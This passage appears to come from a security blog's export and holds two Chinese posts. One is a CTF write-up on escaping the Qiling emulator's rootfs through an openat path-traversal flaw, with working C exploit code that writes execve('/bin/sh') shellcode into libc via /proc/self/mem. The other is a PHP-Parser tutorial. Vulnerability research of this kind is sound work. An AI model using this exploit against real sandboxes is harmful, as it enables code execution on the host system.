python3\n\nimport os\nimport sys\nimport base64\nimport tempfile\n# pip install qiling==1.4.1\nfrom qiling import Qiling\n\ndef my_sandbox(path, rootfs):\n    ql = Qiling([path], rootfs)\n    ql.run()\n\ndef main():\n    sys.stdout.write('Your Binary(base64):\\n')\n    line = sys.stdin.readline()\n    binary = base64.b64decode(line.strip())\n    \n    with tempfile.TemporaryDirectory() as tmp_dir:\n        fp = os.path.join(tmp_dir, 'bin')\n\n        with open(fp, 'wb') as f:\n            f.write(binary)\n\n        my_sandbox(fp, tmp_dir)\n\nif __name__ == '__main__':\n    main()\n\n\n大致分析qiling源代码发现其加载模拟文件的流程如下（可以看qiling项目core.py文件，其中实现了一个Qiling的类）：\n\n在实例初始化阶段设置一系列基础信息比如当前平台的操作系统及其架构等。\n设置运行参数\n设置需要的roofs目录，这里也是出问题的一个关键点\n设置操作系统和结构\n设置大小端序和机器长度\n初始化QlCoreStructs结构体，主要是用来pack的\n加载loader，主要就是根据os type导入loader文件夹下的不同文件。\nlog日志操作\n加载qiling自己实现的内存管理器和寄存器管理器（这个根据interpreter成员来决定是否加载）\n根据不同arch架构来加载qiling自己的实现的arch，就在目录的arch下\n根据interpreter成员来决定是否初始化QlCoreHooks\n启动之前加载loader，加载目标（linux的话里面其实实现了ELF的解析以及加载到内存的整个过程，甚至如果提供了interpreter也可以进行加载，详情可以看loader文件夹下的elf.py），然后起了一个守护页，看注释应该是保护内存的，至此初始化工作完成。\n根据interpreter成员来决定是否选择不同的执行模式，一般直接初始化osHook通过os运行目标文件\n\n上面是大致的加载过程，下面分析一下文件是怎么运行起来的（以模拟linux操作系统为例），运行的方式大致是分为运行qiling独立实现的解释器和不使用qiling独立实现的解释器两种，（作者大佬说是区块链智能合约解释器，这块我不是很懂，好像是智能合约bytecode执行，这里主要说os run）\n在QlOsLinux类里面找到相应的run函数：\ndef run(self):\n    if self.ql.exit_point is not None:\n        self.exit_point = self.ql.exit_point\n\n    try:\n        if self.ql.code:\n            self.ql.emu_start(self.entry_point, (self.entry_point + len(self.ql.code)), self.ql.timeout, self.ql.count)\n        else:\n            if self.ql.multithread == True:\n                # start multithreading\n                thread_management = thread.QlLinuxThreadManagement(self.ql)\n                self.ql.os.thread_management = thread_management\n                thread_management.run()\n\n            else:\n                if  self.ql.entry_point is not None:\n                    self.ql.loader.elf_entry = self.ql.entry_point\n\n                elif self.ql.loader.elf_entry != self.ql.loader.entry_point:\n                    entry_address = self.ql.loader.elf_entry\n                    if self.ql.archtype == QL_ARCH.ARM and entry_address &amp; 1 == 1:\n                        entry_address -= 1\n                    self.ql.emu_start(self.ql.loader.entry_point, entry_address, self.ql.timeout)\n                    self.ql.enable_lib_patch()\n                    self.run_function_after_load()\n                    self.ql.loader.skip_exit_check = False\n                    self.ql.write_exit_trap()\n\n                self.ql.emu_start(self.ql.loader.elf_entry, self.exit_point, self.ql.timeout, self.ql.count)\n\n看了看emu_start，主要是利用unicorn进行模拟执行的。然后看了看linux OS的初始化，总结下来觉得qiling实现的东西还是很多的，比如自己的os loader，arch，syscall，hook等，以x86_64架构下的linux为例子看其是如何加载自己的syscall的。\n        # X8664\n        elif self.ql.archtype == QL_ARCH.X8664:\n            self.gdtm = GDTManager(self.ql)\n            ql_x86_register_cs(self)\n            ql_x86_register_ds_ss_es(self)\n            self.ql.hook_insn(self.hook_syscall, UC_X86_INS_SYSCALL)\n            # Keep test for _cc\n            #self.ql.hook_insn(hook_posix_api, UC_X86_INS_SYSCALL)\n            self.thread_class = thread.QlLinuxX8664Thread     \n            \ndef hook_syscall(self, ql, intno = None):\n        return self.load_syscall()\n\nload_syscall本身比较复杂，通过代码可以看出它都实现了那些syscall，这里的大部门都是直接使用的系统底层的一些syscall，并不是麒麟自己实现的，可以看他的load_syscall函数实现，不过在posix文件夹下的syscall文件夹里面发现其实qiling自己也实现了大量的syscall，这俩种syscall在使用时的区别主要在于要模拟的文件源码中是直接使用的syscall还是类似open的这种函数形式，前者会调用qiling自身实现的，后者则会直接调用对应的系统调用（这块基于推理和调试，不过大致qiling的系统调用就是通过hook进行检测然后通过回调调用对应的代码这样子），调用回溯如下：\n\n其实从上面就可以看出，qiling本身实现的功能还是很多的，比如内存管理，动态模拟不同架构等，但是根据从大佬哪里偷来的经验，首先像python这种高级语言，内存出现问题是很不常见的，大多都是逻辑问题，那么就很可能是实现跟底层系统进行交互的设计出现问题，比如实现的syscall，这也是rwctf的考点。\n漏洞分析​以qiling实现的ql_syscall_open为例子：\ndef ql_syscall_open(ql: Qiling, filename: int, flags: int, mode: int):\n    path = ql.os.utils.read_cstring(filename)\n    real_path = ql.os.path.transform_to_real_path(path)\n    relative_path = ql.os.path.transform_to_relative_path(path)\n    flags &amp;= 0xffffffff\n    mode &amp;= 0xffffffff\n\n    idx = next((i for i in range(NR_OPEN) if ql.os.fd[i] == 0), -1)\n    if idx == -1:\n        regreturn = -EMFILE\n    else:\n        try:\n            if ql.archtype== QL_ARCH.ARM and ql.ostype!= QL_OS.QNX:\n                mode = 0\n            #flags = ql_open_flag_mapping(ql, flags)\n            flags = ql_open_flag_mapping(ql, flags)\n            ql.os.fd[idx] = ql.os.fs_mapper.open_ql_file(path, flags, mode)\n            regreturn = idx\n        except QlSyscallError as e:\n            regreturn = - e.errno\n    ql.log.debug(\"open(%s, 0o%o) = %d\" % (relative_path, mode, regreturn))\n\n    if regreturn &gt;= 0 and regreturn != 2:\n        ql.log.debug(f'File found: {real_path:s}')\n    else:\n        ql.log.debug(f'File not found {real_path:s}')\n\n    return regreturn\n\n首先通过绝对路径获取模拟执行文件在rootfs下的相对路径，然后将flags传递给ql_open_flag_mapping，然后进行open操作，将得到的fd通过idx索引进行一个存储。\n其大致的函数调用链如下：\n\n\n\n\n\n\n\n\n\nql_syscall_open –&gt;  open_ql_file —&gt; os.open\ndef open_ql_file(self, path, openflags, openmode, dir_fd=None):\n    if self.has_mapping(path):\n        self.ql.log.info(f\"mapping {path}\")\n        return self._open_mapping_ql_file(path, openflags, openmode)\n    else:\n        if dir_fd:\n            return ql_file.open(path, openflags, openmode, dir_fd=dir_fd)\n\n        real_path = self.ql.os.path.transform_to_real_path(path)\n        return ql_file.open(real_path, openflags, openmode)\n\n在open_ql_file这里发现可能存在漏洞，函数首先判断文件是否已经打开过了，然后判断是否存在dir_fd，如果不存在的话会调用transform_to_real_path函数，该函数也是实现模拟器文件系统隔离的一个关键，这里面对符号链接文件进行了多重解析，但是好像没对路径进行判断，应该也会出现链接的目标问题，它返回一个文件在系统上面的真实路径，然后由open打开相关文件。\n    def transform_to_real_path(self, path: str) -&gt; str:\n        real_path = self.convert_path(self.ql.rootfs, self.cwd, path)\n\n.......\n\n        return str(real_path.absolute())\n\n但是真正的隔离其实是convert_path实现的：\n@staticmethod\ndef convert_for_native_os(rootfs: Union[str, Path], cwd: str, path: str) -&gt; Path:\n    _rootfs = Path(rootfs)\n    _cwd = PurePosixPath(cwd[1:])\n    _path = Path(path)\n\n    if _path.is_absolute():\n        return _rootfs / QlPathManager.normalize(_path)\n    else:\n        return _rootfs / QlPathManager.normalize(_cwd / _path.as_posix())\n\ndef convert_path(self, rootfs: Union[str, Path], cwd: str, path: str) -&gt; Path:\n    emulated_os = self.ql.ostype\n    hosting_os = self.ql.platform_os\n\n    # emulated os and hosting platform are of the same type\n    if  (emulated_os == hosting_os) or (emulated_os in QL_OS_POSIX and hosting_os in QL_OS_POSIX):\n        return QlPathManager.convert_for_native_os(rootfs, cwd, path)\n\n    elif emulated_os in QL_OS_POSIX and hosting_os == QL_OS.WINDOWS:\n        return QlPathManager.convert_posix_to_win32(rootfs, cwd, path)\n\n    elif emulated_os == QL_OS.WINDOWS and hosting_os in QL_OS_POSIX:\n        return QlPathManager.convert_win32_to_posix(rootfs, cwd, path)\n\n    else:\n        return QlPathManager.convert_for_native_os(rootfs, cwd, path)\n\n这里建立了rootfs，第一步肯定是想到的路径穿越，比如../../../../这种，但是实验发现../../../test也会被拼接成rootfs/test，原因在于convert_for_native_os函数中利用了normalize进行了处理，导致无法进行路径穿越：\n\ndef normalize(path: Union[Path, PurePath]) -&gt; Union[Path, PurePath]:\n    # expected types: PosixPath, PurePosixPath, WindowsPath, PureWindowsPath\n    assert isinstance(path, (Path, PurePath)), f'did not expect {type(path).__name__!r} here'\n\n    normalized_path = type(path)()\n\n    # remove anchor (necessary for Windows UNC paths) and convert to relative path\n    if path.is_absolute():\n        path = path.relative_to(path.anchor)\n\n    for p in path.parts:\n        if p == '.':\n            continue\n\n        if p == '..':\n            normalized_path = normalized_path.parent\n            continue\n\n        normalized_path /= p\n\n    return normalized_path\n\n符号链接就可以绕过检查，但是遗憾的是qiling没有实现symlink的系统调用，不过，回看open_ql_file的代码可以看出，如果dir_fd存在，那么就可以绕过这些检查，这时候自然就可以想到ql_syscall_openat的实现，这个就很简单，里面也没什么严格的检查，因此就可以实现目录穿越。\n漏洞利用​        在实现了目录穿越之后其实问题就变得简单了，我们可以通过/proc/self/maps获取到自身进程的内存信息，然后通过/proc/self/mem实现恶意代码执行，进而完成逃逸，这里展示一个小demo。\n#include&lt;stdio.h&gt;\n#include&lt;fcntl.h&gt;\n#include&lt;string.h&gt;\nunsigned char nop[] = \"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\";\nunsigned char code[] = \"\\x6a\\x68\\x48\\xb8\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x2f\\x73\\x50\\x48\\x89\\xe7\\x68\\x72\\x69\\x1\\x1\\x81\\x34\\x24\\x1\\x1\\x1\\x1\\x31\\xf6\\x56\\x6a\\x8\\x5e\\x48\\x1\\xe6\\x56\\x48\\x89\\xe6\\x31\\xd2\\x6a\\x3b\\x58\\xf\\x5\";\nint main() {\n    char buf[4096] = \"0\";\n    int fd = open(\"/proc/self/maps\", O_RDONLY);\n    int fd_mem = open(\"/proc/self/mem\", O_RDWR);\n    FILE *fp_map = fdopen(fd, \"r\");\n    unsigned long addr = 0;\n    while(1) {\n        fgets(buf, sizeof buf, fp_map);\n        if (strstr(buf, \"r-xp\")!=NULL &amp;&amp; strstr(buf, \"libc-\")) {\n            sscanf(buf, \"%lx-\", &amp;addr);\n            break;\n        }\n    }\n    lseek(fd_mem, addr, SEEK_SET);\n    for (int i=0; i&lt;150; i++) {\n        write(fd_mem, nop, sizeof nop - 1);\n    }\n    write(fd_mem, code, sizeof code);\n    return 0;\n}\n\n不过大家可能会好奇，mem的权限为啥允许写入shellcode：\n\n答案可以参考这篇文章：\n\n\n\n\n\n\n\n\n\nhttps://www.anquanke.com/post/id/257350#h2-0\n至此，我们其实就拥有了整个攻击链，先进行目录穿越找到/proc/self/mem，然后写入shellcode。\nint main() {\n    long start_addr;\n\n    // Open mappings\n    int map = openat(1, \"/proc/self/maps\", O_RDONLY);\n\n    // Open Python process memory\n    int mem = openat(1, \"/proc/self/mem\", O_RDWR);\n    FILE *fp_map = fdopen(map, \"r\");\n\n    // Find the first executable mapping for Libc\n    char line[4096];\n    while (fgets(line, sizeof line, fp_map)) {\n        size_t len = strlen(line);\n        if (strstr(line, \"r-xp\") != NULL &amp;&amp; strstr(line, \"libc-\")) {\n            // Retrive start address of mapping\n            sscanf(line, \"%lx-\", &amp;start_addr);\n            printf(\"%lx\\n\", start_addr);\n            break;\n        }\n    }\n\n    // Seek to the address of the executable mapping for Libc\n    lseek(mem, start_addr, SEEK_SET);\n    for(int i=0; i &lt; 3; i++) {\n        write(mem, nop, sizeof nop -1);\n    }\n    // Write the payload into the executable mapping\n    write(mem, code, sizeof code);\n    return 0;\n}\n\nshellcode就不贴了，占地方，可以参考上面那个demo里面的。\n总结​这个题目本身算是一个容器逃逸的题目，qiling在实现自己的rootfs的时候对系统调用的检测不严格是问题的根源。官方也及时进行了修复：\n\n\n\n\n\n\n\n\n\nhttps://github.com/qilingframework/qiling/pull/1076/commits/6d0fc4a81880abc2984552ccd23497d8832d00fe\n","slug":"Qilin框架分析","date":"2022-01-28T10:48:45.000Z","categories_index":"CTF,容器安全","tags_index":"CTF","author_index":"RainSec"},{"id":"1c56be85ceb7e858a4dda415a10ab942","title":"PHP-Parser的基本使用","content":"PHP-ParserPHP-Parser组件的基础使用，该组件为静态分析和反混淆常用的第三方依赖。\n\n\nWhat is PHP-ParserPHP-Parser是nikic用PHP编写的PHP5.2到PHP7.4解析器，其目的是简化静态代码分析和操作\nPHP-Parser的基础使用这里先贴一下官方文档\nPHP-Parser/doc at master · nikic/PHP-Parser (github.com)\n最基本的是要理解其中Walking the AST的部分\n初始化解析器首先创建实例\nuse PhpParser\\ParserFactory;\n$parser = (new ParserFactory)-&gt;create(ParserFactory::PREFER_PHP7);\n\n这其中有以下参数\nKindBehaviorParserFactory::PREFER_PHP7Try to parse code as PHP 7. If this fails, try to parse it as PHP 5.ParserFactory::PREFER_PHP5Try to parse code as PHP 5. If this fails, try to parse it as PHP 7.ParserFactory::ONLY_PHP7Parse code as PHP 7.ParserFactory::ONLY_PHP5Parse code as PHP 5.\ncreate还有一个参数Lexer，这里先不做讨论\n在实例化之后我们就可以通过\n$stmts = $parser-&gt;parse($code);\n\n来将代码转换成AST\n为了防止抛出异常，最好在try….catch中执行\n生成更加直观的AST当我们var_dump上面的$stmt时，会得到一个比较乱的AST，可以使用NodeDump将其转化为更加直观的AST\n这里需要使用NodeDump\n对于代码\n&lt;?php\nfunction printLine($msg) {\n    echo $msg, \"\\n\";\n}\nprintLine('Hello World!!!');\n\n将其转换为AST\n&lt;?php\nuse PhpParser\\NodeDumper;\n$nodeDumper = new NodeDumper;echo $nodeDumper-&gt;dump($stmts), \"\\n\";\n\n得到以下输出\narray(\n    0: Stmt_Function(\n        byRef: false\n        name: Identifier(\n            name: printLine\n        )\n        params: array(\n            0: Param(\n                type: null\n                byRef: false\n                variadic: false\n                var: Expr_Variable(\n                    name: msg\n                )\n                default: null\n            )\n        )\n        returnType: null\n        stmts: array(\n            0: Stmt_Echo(\n                exprs: array(\n                    0: Expr_Variable(\n                        name: msg\n                    )\n                    1: Scalar_String(\n                        value:\n\n                    )\n                )\n            )\n        )\n    )\n    1: Stmt_Expression(\n        expr: Expr_FuncCall(\n            name: Name(\n                parts: array(\n                    0: printLine\n                )\n            )\n            args: array(\n                0: Arg(\n                    value: Scalar_String(\n                        value: Hello World!!!\n                    )\n                    byRef: false\n                    unpack: false\n                )\n            )\n        )\n    )\n)\n\nNode tree structure上面我们可以看到生成了很多的Node类型\nPHP是一个成熟的脚本语言，它大约有140个不同的节点。但是为了方便使用，将他们分为三类：\n\nPhpParser\\Node\\Stmts是语句节点，即不返回值且不能出现在表达式中的语言构造。例如，类定义是一个语句，它不返回值，你不能编写类似func(class {})的语句。\n\nPhpParser\\Node\\expr是表达式节点，即返回值的语言构造，因此可以出现在其他表达式中。如：$var (PhpParser\\Node\\Expr\\Variable)和func() (PhpParser\\Node\\Expr\\FuncCall)。\n\nPhpParser\\Node\\Scalars是表示标量值的节点，如\"string\" (PhpParser\\Node\\scalar\\string)、0 (PhpParser\\Node\\scalar\\LNumber) 或魔术常量，如”FILE“ (PhpParser\\Node\\scalar\\MagicConst\\FILE) 。所有PhpParser\\Node\\scalar都是延伸自PhpParser\\Node\\Expr，因为scalar也是表达式。\n\n需要注意的是PhpParser\\Node\\Name和PhpParser\\Node\\Arg不在以上的节点之中\n\n\nPretty printerPrettyprinter用来将我们修改后的AST转换回PHP代码，使用如下\nuse PhpParser\\Error;\nuse PhpParser\\ParserFactory;\nuse PhpParser\\PrettyPrinter;\n$code = \"&lt;?php echo 'Hi ', hi\\\\getTarget();\";\n$parser = (new ParserFactory)-&gt;create(ParserFactory::PREFER_PHP7);$prettyPrinter = new PrettyPrinter\\Standard;\ntry {\n    //生成AST\n    $stmts = $parser-&gt;parse($code);\n    //对节点进行操作\n    $stmts[0]         // the echo statement\n          -&gt;exprs     // sub expressions\n          [0]         // the first of them (the string node)\n          -&gt;value     // it's value, i.e. 'Hi '\n          = 'Hello '; // change to 'Hello '\n\n    // pretty print\n    $code = $prettyPrinter-&gt;prettyPrint($stmts);\n    echo $code;\n} catch (Error $e) {\n    echo 'Parse Error: ', $e-&gt;getMessage();\n}\n\n在反混淆中我们一般很少使用$stmts[0]这种方式，因为我们要考虑节点的各种类型\n此外还有prettyPrintExpr()，它可以用来输出一个表达式类型的节点\n例如当你需要提取全局变量时\n&lt;?php\n    $a = $_POST['a'];\n\n他的语法树如下\n0: Stmt_Expression(\n        expr: Expr_Assign(\n            var: Expr_Variable(\n                name: a\n            )\n            expr: Expr_ArrayDimFetch(\n                var: Expr_Variable(\n                    name: _POST\n                )\n                dim: Scalar_String(\n                    value: a\n                )\n            )\n        )\n    )\n\n如果我想获取$_POST[‘a’],我就需要先判断节点类型是不是Expr_ArrayDimFetch\n然后判断$node-&gt;var-&gt;name是不是全局变量\n最后提取$node-&gt;var-&gt;name和$node-&gt;dim-&gt;value然后将它们拼接\n当我的全局变量为$_POST[a]时，dim部分的AST也会变化，我们还需要考虑这种情况。\n但是我们可以使用\n/*\n    用来识别全局变量;\n    如果要获取全局变量格式无需考虑value的节点类型\n    expr: Expr_ArrayDimFetch(\n            var: Expr_Variable(\n                name: _POST\n            )\n    )\n*/\n        if ($node instanceof Node\\Expr\\ArrayDimFetch &amp;&amp; $node-&gt;var instanceof Node\\Expr\\Variable &amp;&amp; (in_array($node-&gt;var-&gt;name ,GLOBAL_VAR)))\n        {\n            self::$globalname = $this-&gt;prettyPrinter-&gt;prettyPrintExpr($node);\n        }\n\n其中\n$this-&gt;prettyPrinter-&gt;prettyPrintExpr($node);\n\n就会返回该Expr节点的表达式，无论是$_POST['a']还是$_POST[a]都可以正常返回\nPHP-Parser/Pretty_printing.markdown at master · nikic/PHP-Parser (github.com)\nNode traversation我们使用PHP-Parser对文件的节点进行修改，最关键的就是编写节点遍历操作\n使用PhpParser\\NodeTraverser我们可以遍历每一个节点，举几个简单的例子：解析php中的所有字符串，并输出\n&lt;?php\nuse PhpParser\\Error;\nuse PhpParser\\ParserFactory;\nuse PhpParser\\NodeTraverser;\nuse PhpParser\\NodeVisitorAbstract;\nuse PhpParser\\Node;\n\nrequire 'vendor/autoload.php';\n\nclass MyVisitor extends NodeVisitorAbstract{\n    public function leaveNode(Node $node)\n    {\n        //判断如果是一个String_节点，就输出\n        if ($node instanceof Node\\Scalar\\String_)\n        {\n            echo $node -&gt; value,\"\\n\";\n        }\n\n    }\n}\n\n$code = file_get_contents(\"./test.php\");\n\n//实例化解释器\n$parser = (new ParserFactory)-&gt;create(ParserFactory::PREFER_PHP7);\n$traverser = New NodeTraverser;\n//添加自己的Visitor\n$traverser-&gt;addVisitor(new MyVisitor);\n\ntry {\n    //转化AST\n    $ast = $parser-&gt;parse($code);\n    //开始遍历\n    $stmts = $traverser-&gt;traverse($ast);\n} catch (Error $error) {\n    echo \"Parse error: {$error-&gt;getMessage()}\\n\";\n    return;\n}\n\n?&gt;\n\n替换php脚本中函数以及类的成员方法函数名为小写\nclass MyVisitor extends NodeVisitorAbstract{\n    public function leaveNode(Node $node)\n    {\n        if( $node instanceof Node\\Expr\\FuncCall) {\n            $node-&gt;name-&gt;parts[0]=strtolower($node-&gt;name-&gt;parts[0]);\n        }elseif($node instanceof Node\\Stmt\\ClassMethod){\n            $node-&gt;name-&gt;name=strtolower($node-&gt;name-&gt;name);\n        }elseif ($node instanceof Node\\Stmt\\Function_){\n            $node-&gt;name-&gt;name=strtolower($node-&gt;name-&gt;name);\n        }elseif($node instanceof Node\\Expr\\MethodCall){\n            $node-&gt;name-&gt;name=strtolower($node-&gt;name-&gt;name);\n        }\n    }\n}\n\n需要注意的是所有的visitors都必须实现PhpParser\\NodeVisitor接口，该接口定义了如下4个方法：\npublic function beforeTraverse(array $nodes);\npublic function enterNode(\\PhpParser\\Node $node);\npublic function leaveNode(\\PhpParser\\Node $node);\npublic function afterTraverse(array $nodes);\n\n\nbeforeTraverse方法在遍历开始之前调用一次，并将其传递给调用遍历器的节点。此方法可用于在遍历之前重置值或准备遍历树。\n\nafterTraverse方法与beforeTraverse方法类似，唯一的区别是它只在遍历之后调用一次。\n\n在每个节点上都调用enterNode和leaveNode方法，前者在它被输入时，即在它的子节点被遍历之前，后者在它被离开时。\n\n这四个方法要么返回更改的节点，要么根本不返回(即null)，在这种情况下，当前节点不更改。\n\n\n例子基于 AST（抽象语法树）解 PHP 混淆 | J0k3r’s Blog\nP.S.我们需要知道你需要什么样的Node，进行什么样的操作，Node下数据的格式会有哪几种情况，会不会因为代码不够严谨导致错误或者无限递归\n","slug":"PHP-Parser","date":"2022-01-28T10:38:45.000Z","categories_index":"漏洞挖掘","tags_index":"PHP","author_index":"RainSec"}]